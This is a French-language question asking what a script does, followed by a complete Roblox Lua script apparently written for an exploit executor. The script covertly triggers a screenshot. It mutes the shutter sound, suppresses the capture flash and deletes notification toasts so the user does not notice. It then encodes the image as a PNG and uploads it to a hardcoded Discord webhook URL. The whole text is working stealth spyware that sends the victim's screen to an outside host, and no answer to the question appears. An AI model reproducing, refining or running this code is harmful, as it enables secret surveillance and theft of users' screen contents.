que fait ce script ? local AssetService = game:GetService("AssetService")
local CoreGui = game:GetService("CoreGui")
local VirtualInputManager = game:GetService("VirtualInputManager")
local RobloxGui = CoreGui:WaitForChild("RobloxGui")
local WEBHOOK = "https://discord.com/api/webhooks/1496711065625432236/m_X0Yim1EyfANVWMXwY6WIhTO-RqZWbuxKmWgqytRsCnbU1NSSRUPA2HHriAZeyDpRch"

local bxor,band,rshift=bit32.bxor,bit32.band,bit32.rshift
local char=string.char
local tconcat=table.concat
local mfloor=math.floor
local readu8=buffer.readu8
local readu32=buffer.readu32
local writeu32=buffer.writeu32

local crcTable=table.create(256)
for i=0,255 do
    local c=i
    for _=1,8 do c=c%2==1 and bxor(0xEDB88320,rshift(c,1)) or rshift(c,1) end
    crcTable[i]=c
end

local function crc32(data)
    local crc=0xFFFFFFFF
    for i=1,#data do 
        crc=bxor(crcTable[band(bxor(crc,data:byte(i)),0xFF)],rshift(crc,8)) 
        if i%100000==0 then task.wait() end
    end
    return bxor(crc,0xFFFFFFFF)
end

local function adler32(data)
    local s1,s2=1,0
    for i=1,#data do 
        s1=(s1+data:byte(i))%65521 s2=(s2+s1)%65521 
        if i%100000==0 then task.wait() end
    end
    return s2*65536+s1
end

local function u32be(n)
    return char(band(rshift(n,24),0xFF),band(rshift(n,16),0xFF),band(rshift(n,8),0xFF),band(n,0xFF))
end

local function u16le(n)
    return char(band(n,0xFF),band(rshift(n,8),0xFF))
end

local function pngChunk(t,data)
    return u32be(#data)..t..data..u32be(crc32(t..data))
end

local function zlibStore(data)
    local blocks,i,len={},1,#data
    while i<=len do
        local b=data:sub(i,i+65534)
        local bl=#b
        blocks[#blocks+1]=char((i+65534>=len) and 1 or 0)..u16le(bl)..u16le(bxor(bl,0xFFFF))..b
        i=i+65535
        task.wait()
    end
    return "\x78\x01"..tconcat(blocks)..u32be(adler32(data))
end

local function buildPNG(pixels,w,h)
    local scanlines=table.create(h)
    for y=0,h-1 do
        local row=table.create(w+1)
        row[1]="\x00"
        local base=y*w*4
        local ri,x=2,0
        while x<=w-4 do
            local o=base+x*4
            row[ri]=char(readu8(pixels,o),readu8(pixels,o+1),readu8(pixels,o+2),readu8(pixels,o+3))
            row[ri+1]=char(readu8(pixels,o+4),readu8(pixels,o+5),readu8(pixels,o+6),readu8(pixels,o+7))
            row[ri+2]=char(readu8(pixels,o+8),readu8(pixels,o+9),readu8(pixels,o+10),readu8(pixels,o+11))
            row[ri+3]=char(readu8(pixels,o+12),readu8(pixels,o+13),readu8(pixels,o+14),readu8(pixels,o+15))
            ri=ri+4 x=x+4
        end
        while x<w do
            local o=base+x*4
            row[ri]=char(readu8(pixels,o),readu8(pixels,o+1),readu8(pixels,o+2),readu8(pixels,o+3))
            ri=ri+1 x=x+1
        end
        scanlines[y+1]=tconcat(row)
        if y%60==0 then task.wait() end
    end
    local raw=tconcat(scanlines)
    task.wait()
    return "\x89PNG\r\n\x1a\n"
        ..pngChunk("IHDR",u32be(w)..u32be(h).."\x08\x06\x00\x00\x00")
        ..pngChunk("IDAT",zlibStore(raw))
        ..pngChunk("IEND","")
end

local function sendToWebhook(pngData)
    local httpRequest=(http and http.request) or (syn and syn.request) or request or nil
    if not httpRequest then return end
    local boundary="B"..tostring(math.random(1e8,9e8))
    httpRequest({
        Url=WEBHOOK,
        Method="POST",
        Headers={["Content-Type"]="multipart/form-data; boundary="..boundary},
        Body="--"..boundary.."\r\n"
            ..'Content-Disposition: form-data; name="file"; filename="s.png"\r\n'
            .."Content-Type: image/png\r\n\r\n"
            ..pngData.."\r\n"
            .."--"..boundary.."--"
    })
end

local CorePackages = game:GetService("CorePackages")

local CorePackages = game:GetService("CorePackages")
local VIM = game:GetService("VirtualInputManager")
local GuiService = game:GetService("GuiService")

local function grabAndSend()

    -- 1. VÉRIFICATION : Est-ce que le menu a DÉJÀ été chargé par le passé ?
    local contentFrame = nil
    local isAlreadyMounted = false
    
    pcall(function()
        local innerFrame = RobloxGui.SettingsClippingShield.SettingsShield.MenuContainer.Page.PageViewClipper.PageView.PageViewInnerFrame
        local capturesFolder = innerFrame:FindFirstChild("Captures")
        if capturesFolder then
            contentFrame = capturesFolder.CapturesPage.CapturesGallery.GalleryGridView.ScrollingFrame.GridView["1"].Content
            if contentFrame then
                isAlreadyMounted = true
            end
        end
    end)

    local wasOpen = GuiService.MenuIsOpen
    local blockerGui = nil

    if isAlreadyMounted then
        -- L'onglet Captures est DEJA en mémoire ! On saute l'ouverture du menu et on capture direct.
    else
        -- L'onglet Captures n'est pas en mémoire. Ouverture express...
        
        -- On ne téléporte PLUS le menu, car forcer sa position casse le système "Roact" de Roblox
        -- et vous empêche de l'utiliser plus tard dans la partie ! Le menu va juste "flasher" 0.1 seconde.
        
        -- OUVERTURE DU MENU (Instantanée, sans attendre d'animations)
        if not wasOpen then
            GuiService:SetMenuIsOpen(true)
            task.wait(0.05)
        end
        
        -- C. CLIC SUR L'ONGLET CAPTURES (Système Carré Bleu rapide)
        local hubBar = RobloxGui:FindFirstChild("HubBar", true)
        local capturesBtn
        if hubBar then
            for _, obj in ipairs(hubBar:GetDescendants()) do
                if obj:IsA("TextLabel") and string.find(string.lower(obj.Text), "capture") then
                    capturesBtn = obj.Parent
                    break
                elseif obj:IsA("GuiObject") and (string.find(obj.Name, "CapturesTab") or obj.Name == "Captures") then
                    capturesBtn = obj
                    break
                end
            end
        end
        
        if capturesBtn then
            pcall(function() GuiService.SelectedCoreObject = capturesBtn end)
            if not GuiService.SelectedCoreObject then pcall(function() GuiService.SelectedObject = capturesBtn end) end
            
            VIM:SendKeyEvent(true, Enum.KeyCode.Return, false, game)
            task.wait(0.03)
            VIM:SendKeyEvent(false, Enum.KeyCode.Return, false, game)
            
            local innerFrame = RobloxGui.SettingsClippingShield.SettingsShield.MenuContainer.Page.PageViewClipper.PageView.PageViewInnerFrame
            for i = 1, 20 do
                local capturesFolder = innerFrame:FindFirstChild("Captures")
                if capturesFolder then
                    pcall(function() GuiService.SelectedCoreObject = nil end)
                    break
                end
                task.wait(0.03)
            end
        end

        -- D. RÉCUPÉRATION APRES CHARGEMENT
        pcall(function()
            local innerFrame = RobloxGui.SettingsClippingShield.SettingsShield.MenuContainer.Page.PageViewClipper.PageView.PageViewInnerFrame
            local capturesFolder = innerFrame:FindFirstChild("Captures")
            if capturesFolder then
                contentFrame = capturesFolder:WaitForChild("CapturesPage", 2).CapturesGallery.GalleryGridView.ScrollingFrame.GridView:WaitForChild("1", 2):WaitForChild("Content", 2)
            end
        end)
    end
    local imageUri = contentFrame and contentFrame.Image
    if imageUri then
        -- Image trouvée
    end

    -- 5. FERMETURE DU MENU (Toujours très rapide)
    if not isAlreadyMounted then
        if not wasOpen then
            GuiService:SetMenuIsOpen(false)
        end
    end

    -- 6. CONTINUATION NORMALE (Création buffer, envois)
    if not imageUri or imageUri == "" then 
        return 
    end
    
    local original
    local ok2, err2 = pcall(function()
        original = AssetService:CreateEditableImageAsync(Content.fromUri(imageUri))
    end)
    
    if not ok2 or not original then
        return 
    end
    
    local srcW, srcH = original.Size.X, original.Size.Y
    local srcPixels
    
    local ok3, err3 = pcall(function()
        srcPixels = original:ReadPixelsBuffer(Vector2.zero, Vector2.new(srcW, srcH))
    end)
    
    if not ok3 or not srcPixels then
        return 
    end
    
    task.spawn(function()
        -- On fixe la hauteur à 750 pixels (750p) demandé par l'utilisateur
        local TARGET_H = 750
        local scale = TARGET_H / srcH
        local dstH = TARGET_H
        local dstW = math.floor(srcW * scale)
        
        -- Si l'image est déjà plus petite que 600p, on ne la réduit pas
        if scale >= 1 then
            dstW, dstH, scale = srcW, srcH, 1
        end

        local dstPixels = buffer.create(dstW * dstH * 4)
        local srcStride = srcW * 4
        local dstOff = 0
        
        -- Algorithme de redimensionnement Nearest-Neighbor Ultra Rapide
        for dy = 0, dstH - 1 do
            local sy = math.floor(dy / scale)
            if sy >= srcH then sy = srcH - 1 end
            local srcRowOffset = sy * srcStride
            
            for dx = 0, dstW - 1 do
                local sx = math.floor(dx / scale)
                if sx >= srcW then sx = srcW - 1 end
                
                local srcOff = srcRowOffset + (sx * 4)
                writeu32(dstPixels, dstOff, readu32(srcPixels, srcOff))
                dstOff = dstOff + 4
            end
            if dy % 30 == 0 then task.wait() end
        end
        
        local pngData = buildPNG(dstPixels, dstW, dstH)
        sendToWebhook(pngData)
    end)
end

local GuiService = game:GetService("GuiService")

-- ============================================================
-- FIX : Désactiver HideCoreGuiForCaptures sur le ScreenshotHud
-- AVANT de déclencher Alt+1. Sans ça, le CoreScript cachait TOUT
-- via SetCoreGuiEnabled(TOUT, false) sans restauration fiable.
-- ============================================================
local hud = GuiService:FindFirstChildWhichIsA("ScreenshotHud")
if not hud then
    pcall(function()
        hud = Instance.new("ScreenshotHud")
        hud.Parent = GuiService
    end)
end
if hud then
    hud.HidePlayerGuiForCaptures = false
    hud.HideCoreGuiForCaptures = false
end

-- Désactiver CaptureOverlay (flash visuel)
local realOverlay = CoreGui:FindFirstChild("CaptureOverlay")
if realOverlay and realOverlay:IsA("ScreenGui") then
    realOverlay.Enabled = false
    realOverlay:GetPropertyChangedSignal("Enabled"):Connect(function()
        realOverlay.Enabled = false
    end)
end

local UserInputService = game:GetService("UserInputService")
-- Muter le son de l'obturateur
for _, obj in ipairs(RobloxGui:GetDescendants()) do
    if obj:IsA("Sound") and obj.Name == "ShutterSound" then obj.Volume = 0 end
end

-- Bloquer les Toast
local furtifUI = CoreGui.DescendantAdded:Connect(function(obj)
    if obj.Name == "ToastContainer" or obj.Name == "Toast" then
        obj.Visible = false
        obj:Destroy()
    end
end)

-- Anti-Disparition de la souris
-- On spamme le moteur pour forcer le curseur à rester visible pendant la photo !
local UserInputService = game:GetService("UserInputService")
task.spawn(function()
    for i = 1, 30 do
        UserInputService.OverrideMouseIconBehavior = Enum.OverrideMouseIconBehavior.None
        UserInputService.MouseIconEnabled = true
        task.wait(0.05)
    end
end)

-- Comme Xeno bloque les fonctions C++ avancées ("Attempt to call a blocked function"),
-- on utilise la méthode VIM classique et fiable.
-- Déclencher la capture classique via Alt+1
VirtualInputManager:SendKeyEvent(true, Enum.KeyCode.LeftAlt, false, game)
task.wait(0.05)
VirtualInputManager:SendKeyEvent(true, Enum.KeyCode.One, false, game)
task.wait(0.05)
VirtualInputManager:SendKeyEvent(false, Enum.KeyCode.One, false, game)
VirtualInputManager:SendKeyEvent(false, Enum.KeyCode.LeftAlt, false, game)

task.wait(1.5)

furtifUI:Disconnect()
grabAndSend()
